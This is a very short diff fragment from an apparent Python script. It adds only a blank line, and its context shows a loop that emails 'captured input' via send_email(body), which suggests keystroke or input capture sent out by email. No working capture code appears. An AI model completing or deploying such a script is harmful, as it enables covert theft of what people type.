@@ -92,3 +92,4 @@ while True:
     
     # Send email with the captured input
     send_email(body)
+
